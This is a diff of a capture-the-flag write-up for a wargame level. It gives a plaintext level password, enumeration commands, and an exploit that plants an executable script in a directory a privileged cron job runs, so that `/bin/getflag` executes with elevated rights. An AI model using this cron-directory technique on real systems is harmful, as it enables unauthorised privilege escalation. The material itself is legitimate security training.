@@ -7,16 +7,13 @@ Login
 > Password: ne2searoevaevoem4ov4ar8ap
 ```
 
-First observation
-- an empty dir and nothing happens
+Observation
 - a _hint_ says "mail" and "cronjob"
+- also doing `find / -name level05 2>/dev/null` tells us 'mail' is the key
 
 Inspect `/var/mail`
 
 ```b
-> crontab -l
-no crontab for level05
-
 > ls /var/mail
 level05
 
@@ -58,9 +55,9 @@ Exploit
 - put a script inside `/opt/openarenaserver/` 
 
 ```r
-$ echo '/bin/getflag > /tmp/temp' \
-> /opt/openarenaserver/solve.sh && \
-chmod +x /opt/openarenaserver/solve.sh
+$ \
+echo '/bin/getflag > /tmp/temp' > /opt/openarenaserver/go.sh && \
+chmod +x /opt/openarenaserver/go.sh
 
 # remember
 # `/usr/sbin/openarenaserver` runs `bash -x` in a subshell
